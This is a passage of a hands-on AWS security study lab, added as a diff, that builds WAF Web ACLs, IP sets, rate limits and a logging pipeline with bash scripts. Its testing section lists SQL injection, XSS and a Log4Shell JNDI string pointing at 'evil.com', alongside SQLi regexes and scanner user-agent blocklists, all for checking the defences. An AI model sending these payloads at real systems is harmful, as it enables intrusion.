@@ -1,0 +1,1960 @@
+# 📅 Day 37 — Section 3: Lab 102
+## AWS WAF & Shield — Full Exploration & Configuration
+
+---
+
+## 🎯 Lab Objective
+In this lab you will:
+- Create WAF Web ACLs with multiple rule types
+- Configure AWS Managed Rule Groups
+- Set up rate-based rules
+- Create custom IP sets and geo-blocking rules
+- Configure WAF logging pipeline
+- Test rules using COUNT mode
+- Set up Shield Advanced monitoring (reference)
+- Implement automated IP blocking
+- Audit via CloudTrail
+- Cleanup all resources
+
+---
+
+## Prerequisites Check
+
+```bash
+#!/bin/bash
+# Lab 102 - Prerequisites Check
+# Day 37 - AWS Security Specialist Study Plan
+
+echo "================================================"
+echo "  Lab 102: AWS WAF & Shield Prerequisites"
+echo "================================================"
+
+# Step 1: Verify identity
+echo ""
+echo "[1] Verifying AWS identity..."
+aws sts get-caller-identity --output table
+
+# Step 2: Capture environment
+ACCOUNT_ID=$(aws sts get-caller-identity \
+  --query Account --output text)
+REGION=$(aws configure get region)
+CALLER_ARN=$(aws sts get-caller-identity \
+  --query Arn --output text)
+
+echo ""
+echo "Account ID : $ACCOUNT_ID"
+echo "Region     : $REGION"
+echo "Caller ARN : $CALLER_ARN"
+
+# Step 3: Check existing WAF Web ACLs
+echo ""
+echo "[2] Checking existing WAF Web ACLs (regional)..."
+aws wafv2 list-web-acls \
+  --scope REGIONAL \
+  --query 'WebACLs[*].{
+    Name:Name,
+    Id:Id,
+    ARN:ARN
+  }' \
+  --output table 2>/dev/null || \
+  echo "No existing Web ACLs"
+
+# Step 4: Check WAF in us-east-1 (for CloudFront)
+echo ""
+echo "[3] Checking WAF Web ACLs in us-east-1 (CloudFront)..."
+aws wafv2 list-web-acls \
+  --scope CLOUDFRONT \
+  --region us-east-1 \
+  --query 'WebACLs[*].{
+    Name:Name,
+    Id:Id
+  }' \
+  --output table 2>/dev/null || \
+  echo "No CloudFront Web ACLs"
+
+# Step 5: Check available ALBs
+echo ""
+echo "[4] Checking available ALBs..."
+aws elbv2 describe-load-balancers \
+  --query 'LoadBalancers[*].{
+    Name:LoadBalancerName,
+    ARN:LoadBalancerArn,
+    Type:Type,
+    Scheme:Scheme
+  }' \
+  --output table 2>/dev/null || \
+  echo "No ALBs found"
+
+# Step 6: Check Shield subscription
+echo ""
+echo "[5] Checking Shield subscription..."
+aws shield describe-subscription \
+  --query 'Subscription.{
+    StartTime:StartTime,
+    EndTime:EndTime,
+    AutoRenew:AutoRenew
+  }' \
+  --output table 2>/dev/null || \
+  echo "Shield Advanced not subscribed (Standard active)"
+
+# Step 7: Save environment
+cat > /tmp/lab102-env.sh << EOF
+export ACCOUNT_ID="$ACCOUNT_ID"
+export REGION="$REGION"
+export CALLER_ARN="$CALLER_ARN"
+EOF
+
+echo ""
+echo "✅ Environment saved to /tmp/lab102-env.sh"
+echo "================================================"
+echo "Prerequisites check complete!"
+echo "================================================"
+```
+
+---
+
+## Part 1 — Create IP Sets & Rule Groups
+
+```bash
+#!/bin/bash
+# Lab 102 - Part 1: Create IP Sets & Rule Groups
+# Day 37 - AWS Security Specialist Study Plan
+
+source /tmp/lab102-env.sh
+
+echo "================================================"
+echo "  Part 1: Create IP Sets & Rule Groups"
+echo "================================================"
+
+# Step 1: Create blocked IPs set
+echo ""
+echo "[1] Creating blocked IPs set..."
+BLOCKED_IPS_ARN=$(aws wafv2 create-ip-set \
+  --name "Lab102-BlockedIPs" \
+  --scope REGIONAL \
+  --ip-address-version IPV4 \
+  --addresses \
+    "192.168.100.0/24" \
+    "10.0.0.1/32" \
+    "172.16.0.0/16" \
+  --description "Lab102 known bad IP addresses" \
+  --tags Key=Lab,Value=Lab102 \
+  --query 'Summary.ARN' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$BLOCKED_IPS_ARN" ]; then
+  echo "✅ Blocked IPs set created"
+  echo "   ARN: $BLOCKED_IPS_ARN"
+  echo "export BLOCKED_IPS_ARN=\"$BLOCKED_IPS_ARN\"" \
+    >> /tmp/lab102-env.sh
+
+  BLOCKED_IPS_ID=$(aws wafv2 list-ip-sets \
+    --scope REGIONAL \
+    --query \
+      'IPSets[?Name==`Lab102-BlockedIPs`].Id' \
+    --output text)
+  echo "export BLOCKED_IPS_ID=\"$BLOCKED_IPS_ID\"" \
+    >> /tmp/lab102-env.sh
+fi
+
+# Step 2: Create allowed IPs set (corporate IPs)
+echo ""
+echo "[2] Creating corporate allowlist IP set..."
+ALLOWED_IPS_ARN=$(aws wafv2 create-ip-set \
+  --name "Lab102-CorporateIPs" \
+  --scope REGIONAL \
+  --ip-address-version IPV4 \
+  --addresses \
+    "203.0.113.0/24" \
+    "198.51.100.0/24" \
+  --description "Lab102 corporate office IP ranges" \
+  --tags Key=Lab,Value=Lab102 \
+  --query 'Summary.ARN' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$ALLOWED_IPS_ARN" ]; then
+  echo "✅ Corporate IPs allowlist created"
+  echo "   ARN: $ALLOWED_IPS_ARN"
+  echo "export ALLOWED_IPS_ARN=\"$ALLOWED_IPS_ARN\"" \
+    >> /tmp/lab102-env.sh
+
+  ALLOWED_IPS_ID=$(aws wafv2 list-ip-sets \
+    --scope REGIONAL \
+    --query \
+      'IPSets[?Name==`Lab102-CorporateIPs`].Id' \
+    --output text)
+  echo "export ALLOWED_IPS_ID=\"$ALLOWED_IPS_ID\"" \
+    >> /tmp/lab102-env.sh
+fi
+
+# Step 3: Create regex pattern set for SQL injection
+echo ""
+echo "[3] Creating regex pattern set for SQLi detection..."
+REGEX_ARN=$(aws wafv2 create-regex-pattern-set \
+  --name "Lab102-SQLiPatterns" \
+  --scope REGIONAL \
+  --regular-expression-list \
+    'RegexString=(?i)(union|select|insert|update|delete|drop|create|alter|exec|execute)' \
+    'RegexString=(?i)(or\s+\d+=\d+|and\s+\d+=\d+)' \
+    'RegexString=(?i)(--|\#|\/\*.*\*\/)' \
+  --description "Lab102 SQL injection patterns" \
+  --tags Key=Lab,Value=Lab102 \
+  --query 'Summary.ARN' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$REGEX_ARN" ]; then
+  echo "✅ SQLi regex pattern set created"
+  echo "   ARN: $REGEX_ARN"
+  echo "export REGEX_ARN=\"$REGEX_ARN\"" \
+    >> /tmp/lab102-env.sh
+
+  REGEX_ID=$(aws wafv2 list-regex-pattern-sets \
+    --scope REGIONAL \
+    --query \
+      'RegexPatternSets[?Name==`Lab102-SQLiPatterns`].Id' \
+    --output text)
+  echo "export REGEX_ID=\"$REGEX_ID\"" \
+    >> /tmp/lab102-env.sh
+fi
+
+# Step 4: Create custom rule group
+echo ""
+echo "[4] Creating custom rule group..."
+RULE_GROUP_ARN=$(aws wafv2 create-rule-group \
+  --name "Lab102-CustomRuleGroup" \
+  --scope REGIONAL \
+  --capacity 100 \
+  --description "Lab102 custom security rules" \
+  --visibility-config \
+    SampledRequestsEnabled=true,\
+CloudWatchMetricsEnabled=true,\
+MetricName=Lab102CustomRuleGroup \
+  --rules '[
+    {
+      "Name": "BlockBadUserAgents",
+      "Priority": 1,
+      "Statement": {
+        "ByteMatchStatement": {
+          "SearchString": "sqlmap",
+          "FieldToMatch": {"SingleHeader": {"Name": "user-agent"}},
+          "TextTransformations": [
+            {"Priority": 0, "Type": "LOWERCASE"}
+          ],
+          "PositionalConstraint": "CONTAINS"
+        }
+      },
+      "Action": {"Block": {}},
+      "VisibilityConfig": {
+        "SampledRequestsEnabled": true,
+        "CloudWatchMetricsEnabled": true,
+        "MetricName": "BlockSQLMapAgent"
+      }
+    },
+    {
+      "Name": "BlockScanner",
+      "Priority": 2,
+      "Statement": {
+        "OrStatement": {
+          "Statements": [
+            {
+              "ByteMatchStatement": {
+                "SearchString": "nikto",
+                "FieldToMatch": {
+                  "SingleHeader": {"Name": "user-agent"}
+                },
+                "TextTransformations": [
+                  {"Priority": 0, "Type": "LOWERCASE"}
+                ],
+                "PositionalConstraint": "CONTAINS"
+              }
+            },
+            {
+              "ByteMatchStatement": {
+                "SearchString": "nessus",
+                "FieldToMatch": {
+                  "SingleHeader": {"Name": "user-agent"}
+                },
+                "TextTransformations": [
+                  {"Priority": 0, "Type": "LOWERCASE"}
+                ],
+                "PositionalConstraint": "CONTAINS"
+              }
+            }
+          ]
+        }
+      },
+      "Action": {"Block": {}},
+      "VisibilityConfig": {
+        "SampledRequestsEnabled": true,
+        "CloudWatchMetricsEnabled": true,
+        "MetricName": "BlockScanners"
+      }
+    }
+  ]' \
+  --tags Key=Lab,Value=Lab102 \
+  --query 'Summary.ARN' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$RULE_GROUP_ARN" ]; then
+  echo "✅ Custom rule group created"
+  echo "   ARN: $RULE_GROUP_ARN"
+  echo "export RULE_GROUP_ARN=\"$RULE_GROUP_ARN\"" \
+    >> /tmp/lab102-env.sh
+
+  RULE_GROUP_ID=$(aws wafv2 list-rule-groups \
+    --scope REGIONAL \
+    --query \
+      'RuleGroups[?Name==`Lab102-CustomRuleGroup`].Id' \
+    --output text)
+  echo "export RULE_GROUP_ID=\"$RULE_GROUP_ID\"" \
+    >> /tmp/lab102-env.sh
+fi
+
+# Step 5: List created resources
+echo ""
+echo "[5] Listing created WAF resources..."
+echo ""
+echo "IP Sets:"
+aws wafv2 list-ip-sets \
+  --scope REGIONAL \
+  --query 'IPSets[?contains(Name,`Lab102`)].{
+    Name:Name,
+    Id:Id
+  }' \
+  --output table
+
+echo ""
+echo "Regex Pattern Sets:"
+aws wafv2 list-regex-pattern-sets \
+  --scope REGIONAL \
+  --query \
+    'RegexPatternSets[?contains(Name,`Lab102`)].{
+      Name:Name,
+      Id:Id
+    }' \
+  --output table
+
+echo ""
+echo "Rule Groups:"
+aws wafv2 list-rule-groups \
+  --scope REGIONAL \
+  --query 'RuleGroups[?contains(Name,`Lab102`)].{
+    Name:Name,
+    Id:Id,
+    Capacity:Capacity
+  }' \
+  --output table
+
+echo ""
+echo "================================================"
+echo "Part 1 Complete!"
+echo "Created:"
+echo "  - Blocked IPs set (3 ranges)"
+echo "  - Corporate allowlist IP set"
+echo "  - SQLi regex pattern set"
+echo "  - Custom rule group (scanner blocking)"
+echo "================================================"
+```
+
+---
+
+## Part 2 — Create Web ACL with Full Rule Set
+
+```bash
+#!/bin/bash
+# Lab 102 - Part 2: Create Web ACL
+# Day 37 - AWS Security Specialist Study Plan
+
+source /tmp/lab102-env.sh
+
+echo "================================================"
+echo "  Part 2: Create Web ACL with Full Rule Set"
+echo "================================================"
+
+# Step 1: Create comprehensive Web ACL
+echo ""
+echo "[1] Creating Web ACL with multiple rule types..."
+WEB_ACL_ARN=$(aws wafv2 create-web-acl \
+  --name "Lab102-WebACL" \
+  --scope REGIONAL \
+  --default-action '{"Allow": {}}' \
+  --description "Lab102 comprehensive WAF Web ACL" \
+  --visibility-config \
+    SampledRequestsEnabled=true,\
+CloudWatchMetricsEnabled=true,\
+MetricName=Lab102WebACL \
+  --rules "[
+    {
+      \"Name\": \"AllowCorporateIPs\",
+      \"Priority\": 0,
+      \"Statement\": {
+        \"IPSetReferenceStatement\": {
+          \"ARN\": \"$ALLOWED_IPS_ARN\"
+        }
+      },
+      \"Action\": {\"Allow\": {}},
+      \"VisibilityConfig\": {
+        \"SampledRequestsEnabled\": true,
+        \"CloudWatchMetricsEnabled\": true,
+        \"MetricName\": \"AllowCorporateIPs\"
+      }
+    },
+    {
+      \"Name\": \"BlockKnownBadIPs\",
+      \"Priority\": 1,
+      \"Statement\": {
+        \"IPSetReferenceStatement\": {
+          \"ARN\": \"$BLOCKED_IPS_ARN\"
+        }
+      },
+      \"Action\": {\"Block\": {}},
+      \"VisibilityConfig\": {
+        \"SampledRequestsEnabled\": true,
+        \"CloudWatchMetricsEnabled\": true,
+        \"MetricName\": \"BlockKnownBadIPs\"
+      }
+    },
+    {
+      \"Name\": \"AWSManagedRulesCommonRuleSet\",
+      \"Priority\": 2,
+      \"OverrideAction\": {\"None\": {}},
+      \"Statement\": {
+        \"ManagedRuleGroupStatement\": {
+          \"VendorName\": \"AWS\",
+          \"Name\": \"AWSManagedRulesCommonRuleSet\"
+        }
+      },
+      \"VisibilityConfig\": {
+        \"SampledRequestsEnabled\": true,
+        \"CloudWatchMetricsEnabled\": true,
+        \"MetricName\": \"AWSManagedRulesCommonRuleSet\"
+      }
+    },
+    {
+      \"Name\": \"AWSManagedRulesKnownBadInputs\",
+      \"Priority\": 3,
+      \"OverrideAction\": {\"None\": {}},
+      \"Statement\": {
+        \"ManagedRuleGroupStatement\": {
+          \"VendorName\": \"AWS\",
+          \"Name\": \"AWSManagedRulesKnownBadInputsRuleSet\"
+        }
+      },
+      \"VisibilityConfig\": {
+        \"SampledRequestsEnabled\": true,
+        \"CloudWatchMetricsEnabled\": true,
+        \"MetricName\": \"AWSManagedRulesKnownBadInputs\"
+      }
+    },
+    {
+      \"Name\": \"AWSIPReputationList\",
+      \"Priority\": 4,
+      \"OverrideAction\": {\"None\": {}},
+      \"Statement\": {
+        \"ManagedRuleGroupStatement\": {
+          \"VendorName\": \"AWS\",
+          \"Name\": \"AWSManagedRulesAmazonIpReputationList\"
+        }
+      },
+      \"VisibilityConfig\": {
+        \"SampledRequestsEnabled\": true,
+        \"CloudWatchMetricsEnabled\": true,
+        \"MetricName\": \"AWSIPReputationList\"
+      }
+    },
+    {
+      \"Name\": \"RateLimitGlobal\",
+      \"Priority\": 5,
+      \"Statement\": {
+        \"RateBasedStatement\": {
+          \"Limit\": 2000,
+          \"AggregateKeyType\": \"IP\"
+        }
+      },
+      \"Action\": {\"Block\": {}},
+      \"VisibilityConfig\": {
+        \"SampledRequestsEnabled\": true,
+        \"CloudWatchMetricsEnabled\": true,
+        \"MetricName\": \"RateLimitGlobal\"
+      }
+    },
+    {
+      \"Name\": \"RateLimitLoginPage\",
+      \"Priority\": 6,
+      \"Statement\": {
+        \"RateBasedStatement\": {
+          \"Limit\": 100,
+          \"AggregateKeyType\": \"IP\",
+          \"ScopeDownStatement\": {
+            \"ByteMatchStatement\": {
+              \"SearchString\": \"/login\",
+              \"FieldToMatch\": {\"UriPath\": {}},
+              \"TextTransformations\": [
+                {\"Priority\": 0, \"Type\": \"LOWERCASE\"}
+              ],
+              \"PositionalConstraint\": \"STARTS_WITH\"
+            }
+          }
+        }
+      },
+      \"Action\": {\"Block\": {}},
+      \"VisibilityConfig\": {
+        \"SampledRequestsEnabled\": true,
+        \"CloudWatchMetricsEnabled\": true,
+        \"MetricName\": \"RateLimitLoginPage\"
+      }
+    },
+    {
+      \"Name\": \"BlockHighRiskCountries\",
+      \"Priority\": 7,
+      \"Statement\": {
+        \"GeoMatchStatement\": {
+          \"CountryCodes\": [\"KP\", \"IR\"]
+        }
+      },
+      \"Action\": {\"Count\": {}},
+      \"VisibilityConfig\": {
+        \"SampledRequestsEnabled\": true,
+        \"CloudWatchMetricsEnabled\": true,
+        \"MetricName\": \"HighRiskCountries\"
+      }
+    },
+    {
+      \"Name\": \"CustomScannerRules\",
+      \"Priority\": 8,
+      \"OverrideAction\": {\"None\": {}},
+      \"Statement\": {
+        \"RuleGroupReferenceStatement\": {
+          \"ARN\": \"$RULE_GROUP_ARN\"
+        }
+      },
+      \"VisibilityConfig\": {
+        \"SampledRequestsEnabled\": true,
+        \"CloudWatchMetricsEnabled\": true,
+        \"MetricName\": \"CustomScannerRules\"
+      }
+    }
+  ]" \
+  --tags Key=Lab,Value=Lab102 \
+         Key=Environment,Value=Production \
+  --query 'Summary.ARN' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$WEB_ACL_ARN" ]; then
+  echo "✅ Web ACL created"
+  echo "   ARN: $WEB_ACL_ARN"
+  echo "export WEB_ACL_ARN=\"$WEB_ACL_ARN\"" \
+    >> /tmp/lab102-env.sh
+
+  WEB_ACL_ID=$(aws wafv2 list-web-acls \
+    --scope REGIONAL \
+    --query \
+      'WebACLs[?Name==`Lab102-WebACL`].Id' \
+    --output text)
+  echo "export WEB_ACL_ID=\"$WEB_ACL_ID\"" \
+    >> /tmp/lab102-env.sh
+else
+  echo "⚠️  Could not create Web ACL"
+  echo "    Check IP set ARNs are correct"
+fi
+
+# Step 2: Describe the created Web ACL
+echo ""
+echo "[2] Describing Web ACL..."
+aws wafv2 get-web-acl \
+  --name "Lab102-WebACL" \
+  --scope REGIONAL \
+  --id $WEB_ACL_ID \
+  --query 'WebACL.{
+    Name:Name,
+    DefaultAction:DefaultAction,
+    Capacity:Capacity,
+    RuleCount:length(Rules)
+  }' \
+  --output table 2>/dev/null
+
+# Step 3: List rules in Web ACL
+echo ""
+echo "[3] Listing rules in priority order..."
+aws wafv2 get-web-acl \
+  --name "Lab102-WebACL" \
+  --scope REGIONAL \
+  --id $WEB_ACL_ID \
+  --query 'WebACL.Rules[*].{
+    Priority:Priority,
+    Name:Name
+  }' \
+  --output table 2>/dev/null
+
+# Step 4: Associate Web ACL with ALB (if exists)
+echo ""
+echo "[4] Associating Web ACL with ALB..."
+ALB_ARN=$(aws elbv2 describe-load-balancers \
+  --query 'LoadBalancers[0].LoadBalancerArn' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$ALB_ARN" ] && \
+   [ "$ALB_ARN" != "None" ]; then
+  aws wafv2 associate-web-acl \
+    --web-acl-arn $WEB_ACL_ARN \
+    --resource-arn $ALB_ARN 2>/dev/null && \
+    echo "✅ Web ACL associated with ALB" || \
+    echo "⚠️  Could not associate (ALB may not be active)"
+else
+  echo "ℹ️  No ALB found — skipping association"
+  echo "   To associate: aws wafv2 associate-web-acl"
+  echo "     --web-acl-arn $WEB_ACL_ARN"
+  echo "     --resource-arn <alb-arn>"
+fi
+
+# Step 5: Create CloudFront Web ACL (us-east-1)
+echo ""
+echo "[5] Creating CloudFront Web ACL in us-east-1..."
+CF_WEB_ACL_ARN=$(aws wafv2 create-web-acl \
+  --name "Lab102-CloudFrontWebACL" \
+  --scope CLOUDFRONT \
+  --region us-east-1 \
+  --default-action '{"Allow": {}}' \
+  --description "Lab102 CloudFront WAF Web ACL" \
+  --visibility-config \
+    SampledRequestsEnabled=true,\
+CloudWatchMetricsEnabled=true,\
+MetricName=Lab102CloudFrontWebACL \
+  --rules '[
+    {
+      "Name": "AWSManagedRulesCommonRuleSet",
+      "Priority": 1,
+      "OverrideAction": {"None": {}},
+      "Statement": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesCommonRuleSet"
+        }
+      },
+      "VisibilityConfig": {
+        "SampledRequestsEnabled": true,
+        "CloudWatchMetricsEnabled": true,
+        "MetricName": "CFCoreRuleSet"
+      }
+    },
+    {
+      "Name": "RateLimitCloudFront",
+      "Priority": 2,
+      "Statement": {
+        "RateBasedStatement": {
+          "Limit": 3000,
+          "AggregateKeyType": "IP"
+        }
+      },
+      "Action": {"Block": {}},
+      "VisibilityConfig": {
+        "SampledRequestsEnabled": true,
+        "CloudWatchMetricsEnabled": true,
+        "MetricName": "CFRateLimit"
+      }
+    }
+  ]' \
+  --tags Key=Lab,Value=Lab102 \
+  --query 'Summary.ARN' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$CF_WEB_ACL_ARN" ]; then
+  echo "✅ CloudFront Web ACL created in us-east-1"
+  echo "   ARN: $CF_WEB_ACL_ARN"
+  echo "export CF_WEB_ACL_ARN=\"$CF_WEB_ACL_ARN\"" \
+    >> /tmp/lab102-env.sh
+fi
+
+echo ""
+echo "================================================"
+echo "Part 2 Complete!"
+echo "Web ACLs created:"
+echo "  1. Lab102-WebACL (REGIONAL - 9 rules)"
+echo "  2. Lab102-CloudFrontWebACL (us-east-1)"
+echo "Rule priority order:"
+echo "  0: Allow corporate IPs"
+echo "  1: Block known bad IPs"
+echo "  2: Core Rule Set (BLOCK)"
+echo "  3: Known Bad Inputs (BLOCK)"
+echo "  4: IP Reputation List (BLOCK)"
+echo "  5: Global rate limit 2000/5min"
+echo "  6: Login rate limit 100/5min"
+echo "  7: High-risk countries (COUNT)"
+echo "  8: Custom scanner rules"
+echo "================================================"
+```
+
+---
+
+## Part 3 — Configure WAF Logging
+
+```bash
+#!/bin/bash
+# Lab 102 - Part 3: WAF Logging Pipeline
+# Day 37 - AWS Security Specialist Study Plan
+
+source /tmp/lab102-env.sh
+
+echo "================================================"
+echo "  Part 3: WAF Logging Pipeline"
+echo "================================================"
+
+# Step 1: Create S3 bucket for WAF logs
+echo ""
+echo "[1] Creating S3 bucket for WAF logs..."
+WAF_LOG_BUCKET="aws-waf-logs-lab102-${ACCOUNT_ID}"
+
+aws s3 mb s3://$WAF_LOG_BUCKET \
+  --region $REGION 2>/dev/null && \
+  echo "✅ WAF log bucket created: $WAF_LOG_BUCKET" || \
+  echo "⚠️  Bucket may already exist"
+
+echo "export WAF_LOG_BUCKET=\"$WAF_LOG_BUCKET\"" \
+  >> /tmp/lab102-env.sh
+
+# Note: WAF log bucket names must start with aws-waf-logs-
+echo "   Note: WAF log bucket names must start with 'aws-waf-logs-'"
+
+# Step 2: Configure bucket lifecycle
+echo ""
+echo "[2] Configuring S3 lifecycle for log retention..."
+aws s3api put-bucket-lifecycle-configuration \
+  --bucket $WAF_LOG_BUCKET \
+  --lifecycle-configuration '{
+    "Rules": [
+      {
+        "ID": "WAFLogRetention",
+        "Status": "Enabled",
+        "Filter": {"Prefix": ""},
+        "Transitions": [
+          {
+            "Days": 30,
+            "StorageClass": "STANDARD_IA"
+          },
+          {
+            "Days": 90,
+            "StorageClass": "GLACIER"
+          }
+        ],
+        "Expiration": {
+          "Days": 365
+        }
+      }
+    ]
+  }' 2>/dev/null && \
+  echo "✅ S3 lifecycle configured (30d→IA, 90d→Glacier, 365d→delete)"
+
+# Step 3: Create Kinesis Firehose for WAF logs
+echo ""
+echo "[3] Creating Kinesis Firehose delivery stream..."
+
+# Create IAM role for Firehose
+cat > /tmp/firehose-trust.json << 'EOF'
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Principal": {
+        "Service": "firehose.amazonaws.com"
+      },
+      "Action": "sts:AssumeRole"
+    }
+  ]
+}
+EOF
+
+FIREHOSE_ROLE_ARN=$(aws iam create-role \
+  --role-name "Lab102-FirehoseRole" \
+  --assume-role-policy-document \
+    file:///tmp/firehose-trust.json \
+  --query 'Role.Arn' \
+  --output text 2>/dev/null)
+
+echo "Firehose Role ARN: $FIREHOSE_ROLE_ARN"
+
+# Attach S3 policy to Firehose role
+cat > /tmp/firehose-policy.json << EOF
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "s3:PutObject",
+        "s3:GetBucketLocation",
+        "s3:ListBucket",
+        "s3:GetObject"
+      ],
+      "Resource": [
+        "arn:aws:s3:::$WAF_LOG_BUCKET",
+        "arn:aws:s3:::$WAF_LOG_BUCKET/*"
+      ]
+    },
+    {
+      "Effect": "Allow",
+      "Action": [
+        "logs:CreateLogGroup",
+        "logs:CreateLogStream",
+        "logs:PutLogEvents"
+      ],
+      "Resource": "*"
+    }
+  ]
+}
+EOF
+
+aws iam put-role-policy \
+  --role-name "Lab102-FirehoseRole" \
+  --policy-name "Lab102-FirehoseS3Policy" \
+  --policy-document \
+    file:///tmp/firehose-policy.json \
+  2>/dev/null && echo "✅ Firehose S3 policy attached"
+
+echo "   Waiting 10s for IAM role to propagate..."
+sleep 10
+
+# Create Firehose delivery stream
+# Note: WAF firehose name must start with aws-waf-logs-
+FIREHOSE_ARN=$(aws firehose create-delivery-stream \
+  --delivery-stream-name "aws-waf-logs-lab102" \
+  --delivery-stream-type DirectPut \
+  --s3-destination-configuration \
+    RoleARN=$FIREHOSE_ROLE_ARN,\
+BucketARN=arn:aws:s3:::$WAF_LOG_BUCKET,\
+Prefix=waf-logs/,\
+ErrorOutputPrefix=waf-errors/,\
+BufferingHints={SizeInMBs=5,IntervalInSeconds=300},\
+CompressionFormat=GZIP \
+  --query 'DeliveryStreamARN' \
+  --output text 2>/dev/null)
+
+if [ ! -z "$FIREHOSE_ARN" ]; then
+  echo "✅ Kinesis Firehose created"
+  echo "   ARN: $FIREHOSE_ARN"
+  echo "export FIREHOSE_ARN=\"$FIREHOSE_ARN\"" \
+    >> /tmp/lab102-env.sh
+else
+  echo "⚠️  Could not create Firehose"
+fi
+
+# Step 4: Enable WAF logging
+echo ""
+echo "[4] Enabling WAF logging to Firehose..."
+
+# Wait for Firehose to be active
+echo "   Waiting for Firehose to become active..."
+sleep 15
+
+aws wafv2 put-logging-configuration \
+  --logging-configuration \
+    ResourceArn=$WEB_ACL_ARN,\
+LogDestinationConfigs=$FIREHOSE_ARN \
+  2>/dev/null && \
+  echo "✅ WAF logging enabled to Firehose → S3" || \
+  echo "⚠️  Could not enable logging"
+
+# Step 5: Configure logging with filters
+echo ""
+echo "[5] Configure logging with filter (BLOCK only)..."
+aws wafv2 put-logging-configuration \
+  --logging-configuration "{
+    \"ResourceArn\": \"$WEB_ACL_ARN\",
+    \"LogDestinationConfigs\": [\"$FIREHOSE_ARN\"],
+    \"LoggingFilter\": {
+      \"DefaultBehavior\": \"DROP\",
+      \"Filters\": [
+        {
+          \"Behavior\": \"KEEP\",
+          \"Conditions\": [
+            {
+              \"ActionCondition\": {
+                \"Action\": \"BLOCK\"
+              }
+            }
+          ],
+          \"Requirement\": \"MEETS_ANY\"
+        }
+      ]
+    }
+  }" 2>/dev/null && \
+  echo "✅ WAF logging filter applied (BLOCK actions only)" || \
+  echo "⚠️  Could not apply logging filter"
+
+# Step 6: Verify logging configuration
+echo ""
+echo "[6] Verifying logging configuration..."
+aws wafv2 get-logging-configuration \
+  --resource-arn $WEB_ACL_ARN \
+  --query 'LoggingConfiguration.{
+    ResourceArn:ResourceArn,
+    LogDestinations:LogDestinationConfigs,
+    FilterBehavior:LoggingFilter.DefaultBehavior
+  }' \
+  --output table 2>/dev/null
+
+# Step 7: Create CloudWatch log group for WAF
+echo ""
+echo "[7] Creating CloudWatch log group for WAF..."
+aws logs create-log-group \
+  --log-group-name "aws-waf-logs/lab102" 2>/dev/null && \
+  echo "✅ CloudWatch log group created"
+
+echo ""
+echo "================================================"
+echo "Part 3 Complete!"
+echo "WAF Logging pipeline:"
+echo "  WAF → Kinesis Firehose → S3"
+echo "  Filter: BLOCK actions only"
+echo "  Retention: 30d→IA, 90d→Glacier, 365d→delete"
+echo "================================================"
+```
+
+---
+
+## Part 4 — Test WAF Rules
+
+```bash
+#!/bin/bash
+# Lab 102 - Part 4: Test WAF Rules
+# Day 37 - AWS Security Specialist Study Plan
+
+source /tmp/lab102-env.sh
+
+echo "================================================"
+echo "  Part 4: Test WAF Rules"
+echo "================================================"
+
+# Step 1: Check Web ACL sampled requests
+echo ""
+echo "[1] Checking sampled requests..."
+aws wafv2 get-sampled-requests \
+  --web-acl-arn $WEB_ACL_ARN \
+  --rule-metric-name "Lab102WebACL" \
+  --scope REGIONAL \
+  --time-window \
+    StartTime=$(date -u -d '1 hour ago' \
+      '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || \
+      date -u -v-1H '+%Y-%m-%dT%H:%M:%SZ'),\
+EndTime=$(date -u '+%Y-%m-%dT%H:%M:%SZ') \
+  --max-items 100 2>/dev/null | \
+  python3 -m json.tool || \
+  echo "No sampled requests in last hour"
+
+# Step 2: Test rule with curl (if ALB exists)
+echo ""
+echo "[2] WAF rule test commands reference..."
+cat << 'EOF'
+# Test WAF rules using curl against your ALB:
+
+# Normal request (should be ALLOWED)
+curl -v https://your-alb-domain.com/ \
+  -H "User-Agent: Mozilla/5.0"
+
+# SQLi attempt (should be BLOCKED by Core Rule Set)
+curl -v "https://your-alb-domain.com/search?q=1' OR '1'='1" \
+  -H "User-Agent: Mozilla/5.0"
+
+# XSS attempt (should be BLOCKED)
+curl -v "https://your-alb-domain.com/page?name=<script>alert(1)</script>" \
+  -H "User-Agent: Mozilla/5.0"
+
+# Scanner user-agent (should be BLOCKED by custom rule)
+curl -v https://your-alb-domain.com/ \
+  -H "User-Agent: sqlmap/1.0"
+
+# Rate limit test (run 200 times in loop)
+for i in $(seq 1 200); do
+  curl -s -o /dev/null -w "%{http_code}\n" \
+    https://your-alb-domain.com/login
+done
+
+# Log4Shell attempt (should be BLOCKED by Known Bad Inputs)
+curl -v https://your-alb-domain.com/ \
+  -H "X-Api-Version: \${jndi:ldap://evil.com/a}"
+EOF
+
+# Step 3: Check WAF metrics in CloudWatch
+echo ""
+echo "[3] Checking WAF CloudWatch metrics..."
+# Check blocked requests metric
+aws cloudwatch get-metric-statistics \
+  --namespace AWS/WAFV2 \
+  --metric-name BlockedRequests \
+  --dimensions \
+    Name=WebACL,Value=Lab102-WebACL \
+    Name=Region,Value=$REGION \
+    Name=Rule,Value=ALL \
+  --start-time $(date -u -d '1 hour ago' \
+    '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || \
+    date -u -v-1H '+%Y-%m-%dT%H:%M:%SZ') \
+  --end-time $(date -u '+%Y-%m-%dT%H:%M:%SZ') \
+  --period 300 \
+  --statistics Sum \
+  --output table 2>/dev/null || \
+  echo "No metrics yet (no traffic)"
+
+# Step 4: Add IP to blocklist (simulate threat response)
+echo ""
+echo "[4] Adding new threat IP to blocklist..."
+aws wafv2 update-ip-set \
+  --name "Lab102-BlockedIPs" \
+  --scope REGIONAL \
+  --id $BLOCKED_IPS_ID \
+  --addresses \
+    "192.168.100.0/24" \
+    "10.0.0.1/32" \
+    "172.16.0.0/16" \
+    "198.18.0.1/32" \
+  --lock-token $(aws wafv2 get-ip-set \
+    --name "Lab102-BlockedIPs" \
+    --scope REGIONAL \
+    --id $BLOCKED_IPS_ID \
+    --query 'LockToken' \
+    --output text 2>/dev/null) \
+  2>/dev/null && \
